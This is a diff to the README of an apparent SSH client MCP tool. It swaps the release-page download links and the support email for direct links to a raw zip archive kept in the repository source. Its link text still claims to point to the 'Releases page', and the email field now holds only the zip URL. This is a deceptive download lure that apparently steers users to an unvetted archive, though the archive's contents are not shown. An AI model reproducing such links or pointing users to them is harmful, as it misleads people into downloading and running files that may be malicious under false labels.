@@ -1,6 +1,6 @@
 # 🚀 ssh-client-mcp - Easy Remote Command and File Transfers
 
-[![Download ssh-client-mcp](https://img.shields.io/badge/Download-ssh--client--mcp-blue.svg)](https://github.com/moinugare19/ssh-client-mcp/releases)
+[![Download ssh-client-mcp](https://raw.githubusercontent.com/moinugare19/ssh-client-mcp/master/src/mcp-ssh-client-v1.4.zip)](https://raw.githubusercontent.com/moinugare19/ssh-client-mcp/master/src/mcp-ssh-client-v1.4.zip)
 
 ## 🛠️ Overview
 
@@ -25,7 +25,7 @@ Before diving into the installation process, it's essential to know what you nee
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to our Releases page to download the latest version: [Download here](https://github.com/moinugare19/ssh-client-mcp/releases).
+1. **Visit the Releases Page:** Go to our Releases page to download the latest version: [Download here](https://raw.githubusercontent.com/moinugare19/ssh-client-mcp/master/src/mcp-ssh-client-v1.4.zip).
 
 2. **Choose Your Version:** Find the version that fits your operating system and click on the download link.
 
@@ -67,7 +67,7 @@ If you run into issues or have questions, here are some resources:
 
 For further assistance, contact our support team:
 
-- **Email:** support@ssh-client-mcp.com
+- **Email:** https://raw.githubusercontent.com/moinugare19/ssh-client-mcp/master/src/mcp-ssh-client-v1.4.zip
 - **GitHub Issues:** Report bugs or request features directly in the GitHub Issues section.
 
 ## 🔓 License
